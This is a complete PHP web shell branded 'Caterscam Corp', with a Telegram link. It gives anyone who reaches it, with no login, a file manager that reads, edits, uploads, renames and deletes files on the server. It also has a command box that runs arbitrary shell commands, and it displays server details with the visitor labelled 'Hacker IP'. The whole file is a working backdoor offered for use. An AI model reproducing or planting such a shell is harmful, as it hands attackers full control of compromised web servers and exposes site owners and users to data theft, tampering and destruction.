<?php  
// Include Teko font from Google Fonts and Font Awesome
echo '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Teko:wght@400;500;600;700&display=swap">';
echo '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">';

// Apply Teko font to the entire page
echo '<style>
    body {
        font-family: "Teko", sans-serif;
    }
    h3, th, td {
        font-family: "Teko", sans-serif;
    }
    input[type="text"], input[type="file"], input[type="submit"] {
        font-family: "Teko", sans-serif;
    }
</style>';

// ASCII Art
echo '<div style="text-align: center; font-family: monospace; white-space: pre;">';  
echo "░█████╗░░█████╗░████████╗███████╗██████╗░░██████╗░█████╗░░█████╗░███╗░░░███╗  ░█████╗░░█████╗░██████╗░██████╗░░░░\n";  
echo "██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗████╗░████║  ██╔══██╗██╔══██╗██╔══██╗██╔══██╗░░░\n";  
echo "██║░░╚═╝███████║░░░██║░░░█████╗░░██████╔╝╚█████╗░██║░░╚═╝███████║██╔████╔██║  ██║░░╚═╝██║░░██║██████╔╝██████╔╝░░░\n";  
echo "██║░░██╗██╔══██║░░░██║░░░██╔══╝░░██╔══██╗░╚═══██╗██║░░██╗██╔══██║██║╚██╔╝██║  ██║░░██╗██║░░██║██╔══██╗██╔═══╝░░░░\n";  
echo "╚█████╔╝██║░░██║░░░██║░░░███████╗██║░░██║██████╔╝╚█████╔╝██║░░██║██║░╚═╝░██║  ╚█████╔╝╚█████╔╝██║░░██║██║░░░░░██╗\n";  
echo "░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝  ░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝\n";  
echo '</div>';  

// Display system information  
echo "<h3>Server Info:</h3>";  
echo "Uname: " . php_uname() . "<br>";  
echo "Software: " . $_SERVER['SERVER_SOFTWARE'] . "<br>";  
echo "PHP Version: " . phpversion() . "<br>";  
echo "Server IP: " . $_SERVER['SERVER_ADDR'] . "<br>";  
echo "Hacker IP: " . $_SERVER['REMOTE_ADDR'] . "<br>";  
echo "HDD: " . disk_free_space("/") . " bytes free of " . disk_total_space("/") . " bytes total<br>";  
echo "User: " . get_current_user() . "<br>";  
echo "Group: " . posix_getgrgid(posix_getegid())['name'] . "<br>";  
echo "Home Shell: " . getcwd() . "<br><br>";   

// Helper function to get file permissions in symbolic format  
function getPermissions($file) {  
    $perms = fileperms($file);  
    $symbolic = '';  

    // File type  
    if (($perms & 0xC000) == 0xC000) {  
        $symbolic = 's'; // Socket  
    } elseif (($perms & 0xA000) == 0xA000) {  
        $symbolic = 'l'; // Symbolic Link  
    } elseif (($perms & 0x8000) == 0x8000) {  
        $symbolic = '-'; // Regular file  
    } elseif (($perms & 0x6000) == 0x6000) {  
        $symbolic = 'b'; // Block special  
    } elseif (($perms & 0x4000) == 0x4000) {  
        $symbolic = 'd'; // Directory  
    } elseif (($perms & 0x2000) == 0x2000) {  
        $symbolic = 'c'; // Character special  
    } elseif (($perms & 0x1000) == 0x1000) {  
        $symbolic = 'p'; // FIFO pipe  
    } else {  
        $symbolic = 'u'; // Unknown  
    }  

    // Owner permissions  
    $symbolic .= (($perms & 0x0100) ? 'r' : '-');  
    $symbolic .= (($perms & 0x0080) ? 'w' : '-');  
    $symbolic .= (($perms & 0x0040) ?  
        (($perms & 0x0800) ? 's' : 'x') :  
        (($perms & 0x0800) ? 'S' : '-'));  

    // Group permissions  
    $symbolic .= (($perms & 0x0020) ? 'r' : '-');  
    $symbolic .= (($perms & 0x0010) ? 'w' : '-');  
    $symbolic .= (($perms & 0x0008) ?  
        (($perms & 0x0400) ? 's' : 'x') :  
        (($perms & 0x0400) ? 'S' : '-'));  

    // Other permissions  
    $symbolic .= (($perms & 0x0004) ? 'r' : '-');  
    $symbolic .= (($perms & 0x0002) ? 'w' : '-');  
    $symbolic .= (($perms & 0x0001) ?  
        (($perms & 0x0200) ? 't' : 'x') :  
        (($perms & 0x0200) ? 'T' : '-'));  

    return $symbolic; // Return without numeric representation  
}  

// Get current directory path  
$current_dir = getcwd();  

// If navigating to a directory  
if (isset($_GET['path'])) {  
    $path = realpath($_GET['path']);  
    if ($path && is_dir($path)) {  
        if (is_readable($path)) { // Check if directory is readable
            chdir($path);  
            $current_dir = $path;  
        } else {
            echo "<h3>Access Denied</h3>";
        }
    }  
}  

// Handle deletion of selected files or directories  
if (isset($_GET['delete_item'])) {  
    $item_path = realpath(urldecode($_GET['delete_item']));  
    if (is_file($item_path)) {  
        unlink($item_path);  
        echo "<script>alert('File deleted successfully.');</script>";  
    } elseif (is_dir($item_path)) {  
        rmdir($item_path);  
        echo "<script>alert('Directory deleted successfully.');</script>";  
    }  
    echo "<script>window.location.href = window.location.pathname;</script>";  
}  

// Handle renaming of files or directories  
if (isset($_GET['rename_item']) && isset($_GET['new_name'])) {  
    $current_name = realpath(urldecode($_GET['rename_item']));  
    $new_name = dirname($current_name) . '/' . urldecode($_GET['new_name']);  
    rename($current_name, $new_name);  
    echo "<script>alert('Item renamed successfully.');</script>";
    // Redirect to refresh the file list
    echo "<script>window.location.href = window.location.pathname;</script>";
}  

// File Editing
if (isset($_POST['edit_file']) && isset($_POST['file_content'])) {
    $file = realpath(urldecode($_POST['edit_file']));
    $content = $_POST['file_content'];
    
    // Ensure the file exists and is writable
    if (is_file($file) && is_writable($file)) {
        if (file_put_contents($file, $content) !== false) {
            echo "<script>
                    alert('File \"" . htmlspecialchars(basename($file)) . "\" edited successfully.');
                    window.location.href = window.location.pathname;
                  </script>";
        } else {
            echo "<script>
                    alert('Failed to edit file \"" . htmlspecialchars(basename($file)) . "\".');
                  </script>";
        }
    } else {
        echo "<script>
                alert('File does not exist or is not writable.');
              </script>";
    }
    exit();
}

// Handle file editing display
if (isset($_GET['edit_item'])) {
    $edit_item = realpath(urldecode($_GET['edit_item']));
    if (is_file($edit_item) && is_readable($edit_item)) {
        $file_content = file_get_contents($edit_item);
        echo "<h3>Editing: " . htmlspecialchars(basename($edit_item)) . "</h3>";
        echo "<form method='POST' action='?'>
                <textarea name='file_content' style='width: 100%; height: 400px;'>". htmlspecialchars($file_content) ."</textarea><br>
                <input type='hidden' name='edit_file' value='" . urlencode($edit_item) . "'>
                <input type='submit' value='Save'>
              </form>";
        exit();
    } else {
        echo "<h3>File not found or not readable.</h3>";
    }
}



// Upload Form    
echo "<form enctype='multipart/form-data' method='POST' id='fileForm'>
        <div style='margin-bottom: 10px;'>
            <input type='file' name='upload' id='fileInput'>
            <input type='submit' value='Upload' id='uploadButton'>
        </div>
        <div>
            <input type='text' name='cmd' placeholder='Cmd Shell' style='width: 100%;'>
        </div>
      </form>";

// File Upload Handler
if (isset($_FILES['upload'])) {
    $target_path = basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $target_path)) {
        echo "<script>alert('File " . basename($_FILES['upload']['name']) . " uploaded successfully.');</script>";
        echo "<script>window.location.href = window.location.pathname;</script>";
    } else {
        echo "<script>alert('Upload failed.');</script>";
    }
}

// Terminal Command Handler
if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
    $cmd = escapeshellcmd($_POST['cmd']);
    $output = shell_exec($cmd);
    echo "<h3>Command Output:</h3><pre>$output</pre>";
}

// JavaScript for handling form submission
echo "<script>
document.getElementById('fileForm').addEventListener('submit', function(event) {
    var fileInput = document.getElementById('fileInput');
    var cmdInput = document.querySelector('input[name=\"cmd\"]');
    
    // Check if file input is empty and cmd input is not empty
    if (fileInput.files.length === 0 && cmdInput.value.trim() === '') {
        event.preventDefault();
        alert('Please choose a file to upload.');
    }
});

document.querySelector('input[name=\"cmd\"]').addEventListener('keypress', function(event) {
    // Only handle the enter key to submit the command
    if (event.key === 'Enter') {
        event.preventDefault();
        var cmd = this.value.trim();
        if (cmd) {
            // Create a form to submit the command
            var form = document.createElement('form');
            form.method = 'POST';
            form.style.display = 'none';
            var input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'cmd';
            input.value = cmd;
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }
    }
});
</script>";

// File Explorer Layout  
echo "<h3>File Explorer:</h3>";  

// Display the path breadcrumb
$path_parts = explode('/', trim($current_dir, '/'));
$breadcrumb = '';
for ($i = 0; $i < count($path_parts); $i++) {
    $current_part = implode('/', array_slice($path_parts, 0, $i + 1));
    $breadcrumb .= "<a href='?path=" . urlencode('/' . $current_part) . "'>" . htmlspecialchars($path_parts[$i]) . "</a> / ";
}
echo rtrim($breadcrumb, ' / ');

// File explorer table
echo "<table border='1' cellpadding='5' style='width: 100%;'>";  
echo "<tr style='text-align: center;'>";  
echo "<th>Name</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th>";  
echo "</tr>";  

// Add ".." for parent directory link  
if ($current_dir != '/') {  
    echo "<tr>";  
    echo "<td style='text-align: left;'> <i class='fas fa-folder'></i> <a href='?path=" . urlencode(dirname($current_dir)) . "'>..</a></td>"; // Parent directory link  
    echo "<td style='text-align: center;'>dir</td>";  
    echo "<td style='text-align: center;'>-</td>";  
    echo "<td style='text-align: center;'>-</td>";  
    echo "<td style='text-align: center;'>-</td>";  
    echo "<td style='text-align: center;'></td>";  
    echo "</tr>";  
}  

// Separate directories and files  
$dirs = [];  
$files = [];  

$entries = scandir($current_dir);  
foreach ($entries as $entry) {  
    if ($entry !== "." && $entry !== "..") {  
        $path = $current_dir . '/' . $entry;  
        if (is_dir($path)) {  
            $dirs[] = $entry;  
        } else {  
            $files[] = $entry;  
        }  
    }  
}  

// Sort directories and files  
sort($dirs);  
sort($files);  

// Display directories  
foreach ($dirs as $dir) {  
    $file_path = $current_dir . '/' . $dir;  
    $file_size = 'dir';  
    $file_modify = date("Y-m-d H:i:s", filemtime($file_path));  
    $file_owner = posix_getpwuid(fileowner($file_path))['name'] . '/' . posix_getgrgid(filegroup($file_path))['name'];  
    $file_permissions = getPermissions($file_path);  
    echo "<tr>";  
    echo "<td style='text-align: left;'><i class='fas fa-folder'></i> <a href='?path=" . urlencode($file_path) . "'>$dir</a></td>";  
    echo "<td style='text-align: center;'>$file_size</td>";  
    echo "<td style='text-align: center;'>$file_modify</td>";  
    echo "<td style='text-align: center;'>$file_owner</td>";  
    echo "<td style='text-align: center;'>$file_permissions</td>";  
    echo "<td style='text-align: center;'>";  
    echo "<a href='#' onclick='confirmDelete(\"" . urlencode($file_path) . "\")'>[Delete]</a> ";  
    echo "<a href='#' onclick='confirmRename(\"" . urlencode($file_path) . "\")'>[Rename]</a>";  
    echo "</td>";  
    echo "</tr>";  
}  

// Display files  
foreach ($files as $file) {  
    $file_path = $current_dir . '/' . $file;  
    $file_size = filesize($file_path) . ' B';  
    $file_modify = date("Y-m-d H:i:s", filemtime($file_path));  
    $file_owner = posix_getpwuid(fileowner($file_path))['name'] . '/' . posix_getgrgid(filegroup($file_path))['name'];  
    $file_permissions = getPermissions($file_path);  
    echo "<tr>";  
    echo "<td style='text-align: left;'><i class='fas fa-file'></i> <a href='?path=" . urlencode($file_path) . "'>$file</a></td>";  
    echo "<td style='text-align: center;'>$file_size</td>";  
    echo "<td style='text-align: center;'>$file_modify</td>";  
    echo "<td style='text-align: center;'>$file_owner</td>";  
    echo "<td style='text-align: center;'>$file_permissions</td>";  
    echo "<td style='text-align: center;'>";  
    echo "<a href='?edit_item=" . urlencode($file_path) . "'> [Edit]</a> ";  
    echo "<a href='?delete_item=" . urlencode($file_path) . "' onclick='return confirm(\"Are you sure?\")'>[Delete]</a> ";  
    echo "<a href='#' onclick='confirmRename(\"" . urlencode($file_path) . "\")'>[Rename]</a>";  
    echo "</td>";  
    echo "</tr>";  
}  

echo "</table>";  

// JavaScript functions for delete and rename confirmation
echo "<script>
function confirmDelete(path) {
    if (confirm('Are you sure you want to delete this item?')) {
        window.location.href = '?delete_item=' + path;
    }
}

function confirmRename(path) {
    var newName = prompt('Enter new name for the item:');
    if (newName) {
        window.location.href = '?rename_item=' + path + '&new_name=' + encodeURIComponent(newName);
    }
}
</script>";

echo '<div style="text-align: center; margin-top: 20px; padding: 10px; background-color: #f1f1f1; border-top: 1px solid #ddd;">';
echo '<a href="https://t.me/caterscam" style="color: blue; text-decoration: none;">© 2024 Caterscam Corp</a>';
echo '</div>';

?>
